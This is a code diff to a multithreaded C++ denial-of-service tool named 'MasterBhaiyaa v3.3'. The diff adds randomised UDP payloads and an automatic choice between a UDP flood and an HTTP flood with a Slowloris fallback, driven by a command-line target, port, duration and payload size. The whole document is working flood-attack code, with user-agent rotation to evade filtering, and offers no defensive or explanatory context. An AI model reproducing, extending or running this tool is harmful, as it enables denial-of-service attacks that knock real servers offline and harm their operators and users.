@@ -21,11 +21,10 @@
 std::atomic<bool> stop_flag(false);
 
 struct AttackConfig {
-    std::string ip;
+    std::string target;
     int port;
     int duration;
     int payload_size;
-    std::string attack_type;
 };
 
 // Signal handler
@@ -34,13 +33,26 @@ void handle_signal(int signal) {
     stop_flag = true;
 }
 
-// Validate IP or Domain
-bool is_valid_target(const std::string &target) {
+// Check if target is an IP
+bool is_ip(const std::string &target) {
     struct sockaddr_in sa;
     return inet_pton(AF_INET, target.c_str(), &(sa.sin_addr)) != 0;
 }
 
-// Generate randomized user-agent
+// Generate random payload
+std::vector<uint8_t> generate_payload(int size) {
+    std::vector<uint8_t> payload(size);
+    std::random_device rd;
+    std::mt19937 gen(rd());
+    std::uniform_int_distribution<uint8_t> dis(0x20, 0x7E);
+
+    for (int i = 0; i < size; ++i) {
+        payload[i] = dis(gen);
+    }
+    return payload;
+}
+
+// Generate random user-agent
 std::string random_user_agent() {
     std::vector<std::string> user_agents = {
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
@@ -60,13 +72,12 @@ void udp_attack(const AttackConfig &config) {
     sockaddr_in target_addr = {};
     target_addr.sin_family = AF_INET;
     target_addr.sin_port = htons(config.port);
-    target_addr.sin_addr.s_addr = inet_addr(config.ip.c_str());
-
-    std::vector<uint8_t> payload(config.payload_size, 0x41);
+    target_addr.sin_addr.s_addr = inet_addr(config.target.c_str());
 
     auto end_time = std::chrono::steady_clock::now() + std::chrono::seconds(config.duration);
 
     while (std::chrono::steady_clock::now() < end_time && !stop_flag) {
+        std::vector<uint8_t> payload = generate_payload(config.payload_size);
         sendto(sock, payload.data(), payload.size(), 0, 
                (struct sockaddr *)&target_addr, sizeof(target_addr));
     }
@@ -79,7 +90,7 @@ void http_flood(const AttackConfig &config) {
     struct sockaddr_in server;
     struct hostent *host;
 
-    host = gethostbyname(config.ip.c_str());
+    host = gethostbyname(config.target.c_str());
     if (!host) return;
 
     server.sin_family = AF_INET;
@@ -96,7 +107,7 @@ void http_flood(const AttackConfig &config) {
         }
 
         std::string request = "GET / HTTP/1.1\r\n"
-                              "Host: " + config.ip + "\r\n"
+                              "Host: " + config.target + "\r\n"
                               "User-Agent: " + random_user_agent() + "\r\n"
                               "Connection: keep-alive\r\n"
                               "\r\n";
@@ -106,12 +117,12 @@ void http_flood(const AttackConfig &config) {
     }
 }
 
-// Slowloris Attack (L7)
+// Slowloris Attack (L7 fallback)
 void slowloris(const AttackConfig &config) {
     struct sockaddr_in server;
     struct hostent *host;
 
-    host = gethostbyname(config.ip.c_str());
+    host = gethostbyname(config.target.c_str());
     if (!host) return;
 
     server.sin_family = AF_INET;
@@ -127,7 +138,7 @@ void slowloris(const AttackConfig &config) {
         }
 
         std::string request = "GET / HTTP/1.1\r\n"
-                              "Host: " + config.ip + "\r\n"
+                              "Host: " + config.target + "\r\n"
                               "User-Agent: " + random_user_agent() + "\r\n";
 
         send(sock, request.c_str(), request.length(), 0);
@@ -150,46 +161,46 @@ void slowloris(const AttackConfig &config) {
 
 // Main function
 int main(int argc, char *argv[]) {
-    if (argc < 4 || argc > 5) {
-        std::cerr << "Usage: ./MasterBhaiyaa <target> <port> <duration> [attack_type]\n";
+    if (argc != 5) {
+        std::cerr << "Usage: ./MasterBhaiyaa <target> <port> <duration> <payload_size>\n";
         return EXIT_FAILURE;
     }
 
     AttackConfig config;
-    config.ip = argv[1];
+    config.target = argv[1];
     config.port = std::stoi(argv[2]);
     config.duration = std::stoi(argv[3]);
-    config.attack_type = (argc == 5) ? argv[4] : "UDP";
+    config.payload_size = std::stoi(argv[4]);
 
-    // Validate Target
-    if (!is_valid_target(config.ip)) {
-        std::cerr << "Invalid target: " << config.ip << "\n";
+    if (!is_ip(config.target) && gethostbyname(config.target.c_str()) == nullptr) {
+        std::cerr << "Invalid target: " << config.target << "\n";
         return EXIT_FAILURE;
     }
 
     std::signal(SIGINT, handle_signal);
 
     std::cout << "=====================================\n";
-    std::cout << "      MasterBhaiyaa v3.3 - L4 & L7     \n";
+    std::cout << "      MasterBhaiyaa v3.3 - Auto L4/L7     \n";
     std::cout << "=====================================\n";
-    std::cout << "Target: " << config.ip << ":" << config.port << "\n";
+    std::cout << "Target: " << config.target << ":" << config.port << "\n";
     std::cout << "Duration: " << config.duration << " seconds\n";
+    std::cout << "Payload Size: " << config.payload_size << " bytes\n";
     std::cout << "Threads: " << THREAD_COUNT << "\n";
-    std::cout << "Attack Type: " << config.attack_type << "\n";
+    std::cout << "Attack Mode: " << (is_ip(config.target) ? "UDP (L4)" : "HTTP (L7)") << "\n";
     std::cout << "=====================================\n\n";
 
     std::vector<std::thread> threads;
 
     for (int i = 0; i < THREAD_COUNT; ++i) {
-        if (config.attack_type == "UDP") {
+        if (is_ip(config.target)) {
             threads.emplace_back(udp_attack, config);
-        } else if (config.attack_type == "HTTP") {
-            threads.emplace_back(http_flood, config);
-        } else if (config.attack_type == "SLOWLORIS") {
-            threads.emplace_back(slowloris, config);
         } else {
-            std::cerr << "Invalid attack type. Use: UDP, HTTP, SLOWLORIS\n";
-            return EXIT_FAILURE;
+            try {
+                threads.emplace_back(http_flood, config);
+            } catch (...) {
+                std::cout << "[!] HTTP attack failed! Switching to Slowloris...\n";
+                threads.emplace_back(slowloris, config);
+            }
         }
         std::cout << "[+] Thread " << i + 1 << " launched.\n";
     }
